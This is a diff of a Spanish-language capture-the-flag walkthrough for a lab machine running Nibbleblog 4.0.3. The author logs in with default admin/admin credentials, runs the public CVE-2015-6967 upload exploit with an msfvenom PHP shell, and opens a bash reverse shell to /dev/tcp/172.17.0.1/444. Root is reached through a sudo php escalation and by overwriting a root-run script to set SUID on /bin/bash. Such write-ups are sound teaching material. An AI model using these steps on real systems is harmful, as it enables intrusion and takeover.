@@ -33,14 +33,18 @@ Finished
 ===============================================================
 ```
 Habiendo probado ya esto, volvemos a la pagina "principal", y entramos al codigo fuente con "CTRL + U"
+
 Aqui vemos algo que nos llama la atencion y es que son varias las veces que encontramos escrito: "<! - - /nibbleblog - - >", por lo que vamos a probar si podemos obtener algo con ello escribiendolo a continuacion de la IP, y.... BINGOOOO !! Encontramos a una pagina algo distinta donde nos da la bienvenida al propio Nibbleblog  y donde, entre otras cosas, vemos el siguiente mensaje:
 ```
 Start publishing from your dashboard http://172.17.0.2/nibbleblog/admin.php
 ```
 Por lo que probaremos a seguir el enlace haciendo pinchando sobre el, lo que nos lleva a un panel de login, asi que probaremos con las credenciales tipicas antes de intentar cualquier otra cosa.
 Casualmente, la primera que he probado, "admin/admin" ha funcionado.
+
 Viendo que entramos al panel de control, vamos directamente a General Settings para ver si podemos sacar informacion y vemos que la version de Nibbleblog instalada es la 4.0.3
+
 Sabiendo esto, vamos a buscar en github si existe alguna vulnerabilidad, hecho lo cual, vemos que hay una.
+
 En mi caso he ido al siguiente enlace de github:
 https://github.com/dix0nym/CVE-2015-6967
 de donde clonaremos el repositorio:
@@ -73,6 +77,7 @@ python3 exploit.py --url http://172.17.0.2/nibbleblog/ --username admin --passwo
 [!] Exploit failed.
 ```
 Pero tal y como se ve, el exploit falla. ¿Y por que? Facil, parece ser que la vulnerabilidad tiene que ver con el plugin de Nibbleblog "My Image", el cual NO esta instalado, por lo que lo instalaremos.
+
 Una vez hecho, volvemos a ponernos a la escucha con NETCAT por el puerto 443 y de nuevo probamos con el comando anterior, el cual esta vez SI funciona tal y como se ve a continuacion:
 ```
 TERMINAL PARA EJECUTAR EL PAYLOAD:
@@ -91,11 +96,13 @@ whoami
 www-data
 ```
 Como hemos usado "msfvenom" con una shell en formato ".php", esta no suele ser muy estable, por lo que abriremos en otra terminal otro NETCAT por el puerto 444 para estabilizar la conexion.
+
 En la terminal del primer NETCAT escribimos entonces:
 ```
 bash -c "sh -i >& /dev/tcp/172.17.0.1/444 0>&1"  <=== Tipica
 ```
 Y ahora si, ya tenemos la conexion estabilizada en nuestra nueva terminal. El resto ya se podrian cerrar para quedarnos unicamente con esta ultima activa.
+
 Es momento ahora de hacer el tratamiento de la TTY, por lo que seguiremos estos pasos:
 ```
 1) Escribimos:
@@ -139,7 +146,9 @@ User www-data may run the following commands on 53305a206d4f:
 www-data@53305a206d4f:/$ 
 
 ```
-Hay un usuario que se llama "chocolate" que puede ejecutar el binario "/usr/bin/php". Antes de seguir y ya que estamos, hacemos "cat /etc/passwd" para ver si hay mas usuarios, pero vemos que no:
+Hay un usuario que se llama "chocolate" que puede ejecutar el binario "/usr/bin/php".
+
+Antes de seguir y ya que estamos, hacemos "cat /etc/passwd" para ver si hay mas usuarios, pero vemos que no:
 ```
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -163,6 +172,7 @@ _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
 chocolate:x:1000:1000::/home/chocolate:/bin/bash  <=== El que nos interesa
 ```
 Habia que asegurarse, asi que... :).
+
 Bueno, volviendo al usuario "chocolate", vamos a buscar en la pagina de "gtfobins" o en mi caso, con el comando "searchbins" como ejecutar el binario "php" como "sudo":
 ```
 searchbins -b php -f sudo
@@ -189,7 +199,9 @@ bash -p
 chocolate@53305a206d4f:/$
 ```
 El problema es que si ponemos ahora "sudo -l", nos pide la contraseña del usuario "chocolate" (la cual no sabemos), asi que nada por este lado.
+
 Probamos entonces con "find / -perm -4000 2>/dev/null" y mas de lo mismo.
+
 Entonces ahora, ¿que podemos hacer? Pues es hora de mirar los procesos que hay corriendo en segundo plano con el comando:
 ```
 ps -faux
@@ -208,7 +220,9 @@ Y tal y como sospechabamos, sus permisos pertenecen al usuario "chocolate":
 -rw-r--r-- 1 chocolate chocolate 59 May  7 13:55 /opt/script.php
 ```
 Viendo que lo esta ejecutando el usuario "root" cada 5sg de forma automatica y que pertenece al usuario "chocolate", lo que deberiamos hacer ahora es bastante sencillo.
+
 Editarlo, modificarlo para darle permisos "SUID" a "/bin/bash" y esperar 5sg a que se "autoejecute" gracias al usuario "root" ;) !!
+
 Escribimos entonces en el terminal:
 ```
 echo '<?php exec("chmod u+s /bin/bash"); ?>' > /opt/script.php
@@ -230,5 +244,6 @@ root
 bash-5.0#
 ```
 Y con esto, la maquina estaria acabada.
+
 ***NOTA: En mi caso particular, y a pesar de estar definida como una maquina "facil", me ha parecido algo mas complicadilla de lo habitual, al nivel de una de dificultad "media".***
 
